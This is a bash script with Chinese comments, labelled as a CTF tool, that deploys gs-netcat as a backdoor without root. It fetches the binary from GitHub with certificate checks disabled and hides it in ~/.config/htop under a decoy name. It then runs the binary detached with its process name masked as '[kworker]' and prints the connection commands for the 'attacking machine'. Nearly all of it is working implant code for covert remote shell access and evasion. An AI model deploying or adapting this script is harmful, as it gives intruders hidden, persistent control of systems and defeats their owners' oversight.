#!/bin/bash
#
# gs-netcat 普通权限部署脚本（CTF 用，无需 root）
# 用法:
#   ./deploy_gsnetcat_user.sh             # 远程下载 + 自动生成密钥
#   ./deploy_gsnetcat_user.sh <本地路径>  # 使用本地文件
#   ./deploy_gsnetcat_user.sh "" <SECRET> # 指定密钥
#

# ========== 可配置参数 ==========

WORK_DIR="/home1/virusin1/.config/htop"

DOWNLOAD_URL="https://github.com/hackerschoice/gsocket/releases/download/v1.4.43/gs-netcat_linux-x86_64"

BIN_NAME="defunct"
KEY_NAME="defunct.dat"
PROC_NAME="[kworker]"

# ================================

BIN_PATH="${WORK_DIR}/${BIN_NAME}"
KEY_PATH="${WORK_DIR}/${KEY_NAME}"

# ---------- 获取密钥 ----------

if [[ -n "$2" ]]; then
    GS_SECRET="$2"
elif [[ -f "${KEY_PATH}" ]]; then
    GS_SECRET=$(cat "${KEY_PATH}")
else
    GS_SECRET=$(tr -dc 'A-Za-z0-9' </dev/urandom | head -c 22)
fi

echo "${GS_SECRET}" > "${KEY_PATH}"

# ---------- 获取二进制 ----------

if [[ -n "$1" && -f "$1" ]]; then
    cp "$1" "${BIN_PATH}"
else
    wget -q --no-check-certificate -O "${BIN_PATH}" "${DOWNLOAD_URL}" \
        || { curl -sS -L -k -o "${BIN_PATH}" "${DOWNLOAD_URL}" \
        || { echo "[-] 下载失败"; exit 1; }; }
fi

chmod 755 "${BIN_PATH}"

# ---------- 启动 ----------

setsid bash -c \
    "SHELL= TERM=xterm-256color GS_ARGS=\"-k ${KEY_PATH} -liqD\" \
     bash -c \"exec -a '${PROC_NAME}' ${BIN_PATH}\"" \
    </dev/null >/dev/null 2>&1 &

sleep 2

# ---------- 结果 ----------

if pgrep -f "${BIN_PATH}" >/dev/null 2>&1; then
    echo "[+] gs-netcat 运行中"
else
    echo "[!] 进程未检测到（可能已后台化，用 -D 参数时正常）"
fi

echo ""
echo "  工作目录:  ${WORK_DIR}"
echo "  密钥:      ${GS_SECRET}"
echo ""
echo "  连接方式 (攻击机执行):"
echo "  gs-netcat -k ${KEY_PATH} -i"
echo "  或: gs-netcat -s ${GS_SECRET} -i"
